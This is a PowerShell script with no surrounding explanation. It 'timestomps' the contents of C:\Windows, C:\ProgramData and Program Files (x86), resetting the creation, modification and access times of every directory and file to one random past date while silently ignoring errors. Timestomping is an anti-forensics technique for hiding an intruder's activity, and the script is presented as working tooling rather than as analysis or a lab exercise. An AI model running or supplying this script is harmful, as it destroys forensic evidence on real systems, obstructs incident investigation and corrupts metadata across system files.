$dirs = @('C:\Windows', 'C:\ProgramData', 'C:\Program Files (x86)')
$randDate = (Get-Date).AddDays(-(Get-Random -Minimum 10 -Maximum 1000))

foreach ($startDir in $dirs) {
    if (-not [System.IO.Directory]::Exists($startDir)) { continue }

    # Use a Stack for iterative traversal (faster and safer than recursion)
    $stack = New-Object System.Collections.Generic.Stack[string]
    $stack.Push($startDir)

    while ($stack.Count -gt 0) {
        $currentDir = $stack.Pop()

        try {
            # Timestomp the directory itself
            try {
                [System.IO.Directory]::SetCreationTime($currentDir, $randDate)
                [System.IO.Directory]::SetLastWriteTime($currentDir, $randDate)
                [System.IO.Directory]::SetLastAccessTime($currentDir, $randDate)
            } catch { }

            # Process files in the current directory
            foreach ($file in [System.IO.Directory]::EnumerateFiles($currentDir)) {
                try {
                    [System.IO.File]::SetCreationTime($file, $randDate)
                    [System.IO.File]::SetLastWriteTime($file, $randDate)
                    [System.IO.File]::SetLastAccessTime($file, $randDate)
                } catch {
                    # Ignore individual file access errors (locked files, etc.)
                }
            }

            # Push subdirectories to the stack
            foreach ($dir in [System.IO.Directory]::EnumerateDirectories($currentDir)) {
                $stack.Push($dir)
            }
        } catch {
            # Ignore directory access errors (Access Denied)
        }
    }
}

